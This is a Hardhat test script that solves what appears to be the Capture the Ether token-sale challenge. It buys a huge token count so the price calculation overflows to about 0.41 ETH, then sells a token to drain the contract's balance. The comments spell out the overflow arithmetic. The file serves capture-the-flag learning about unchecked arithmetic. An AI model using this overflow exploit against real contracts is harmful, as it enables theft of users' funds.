const { expect } = require("chai");
const { ethers } = require("hardhat");

const { utils } = ethers;

describe("TokenSaleTest", function () {
  it("Successfully completes the test", async function () {
    const [signer] = await ethers.getSigners();
    const userAddress = await signer.getAddress();

    const TokenSaleChallenge = await ethers.getContractFactory(
      "TokenSaleChallenge"
    );
    const tokenSaleContract = await TokenSaleChallenge.deploy(userAddress, {
      value: ethers.utils.parseEther("1"),
    });
    await tokenSaleContract.deployed();

    // msg.value == numTokens * PRICE_PER_TOKEN
    // 2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458
    // (2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH

    // (MAX_UINT / 10^18) + 1 = 115792089237316195423570985008687907853269984665640564039458
    // Overflow: 415992086870360064, a little bit below half an ether
    const purchaseTx = await tokenSaleContract.buy(
      "115792089237316195423570985008687907853269984665640564039458",
      {
        value: "415992086870360064",
      }
    );
    await purchaseTx.wait();

    const sellTransaction = await tokenSaleContract.sell(1);
    await sellTransaction.wait();

    expect(await tokenSaleContract.isComplete()).to.be.true;
  });
});
